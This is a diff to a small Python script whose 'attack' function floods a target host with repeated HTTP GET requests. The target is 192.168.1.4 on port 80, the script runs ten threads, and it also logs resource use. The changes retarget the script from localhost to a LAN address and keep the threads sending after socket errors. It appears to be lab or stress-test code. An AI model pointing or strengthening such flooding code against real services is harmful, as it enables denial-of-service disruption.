@@ -3,9 +3,10 @@ import threading
 import logging
 import psutil
 import time
+import random
 
 
-target="127.0.0.1"
+target="192.168.1.4"
 port=80
 trd=10
 fake_ip="127.0.0.1"
@@ -20,21 +21,26 @@ def attack(thread_id):
         try:
             # Create a socket and connect to the target
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5)  # Set timeout to avoid hanging indefinitely
             s.connect((target, port))
 
             # Send data to simulate an HTTP GET request
-            s.sendto(("GET /" + "A" * 500 + " HTTP/1.1\r\n").encode("utf-8"), (target, port))
-            s.sendto(("Host: " + target + "\r\n\r\n").encode("utf-8"), (target, port))
+            request = f"GET /{'A' * 500} HTTP/1.1\r\nHost: {target}\r\n\r\n"
+            s.sendall(request.encode("utf-8"))
 
             # Log each request sent
             count += 1
             logging.info(f"Thread {thread_id} sent request {count}")
 
-            s.close()
-            time.sleep(1)  # Add delay to control request rate
-        except Exception as e:
-            logging.error(f"Thread {thread_id} encountered an error: {e}")
-            break  # Break loop on error to avoid infinite retries in case of network issues
+        except BrokenPipeError:
+            logging.error(f"Thread {thread_id} encountered a BrokenPipeError")
+        except socket.error as e:
+            logging.error(f"Thread {thread_id} encountered a socket error: {e}")
+        finally:
+            s.close()  # Ensure the socket is closed
+
+        # Random delay to avoid overwhelming the server
+        time.sleep(random.uniform(0.5, 1.5))
 
 def monitor_resources():
     "Monitors and logs CPU and Memory usage every second"
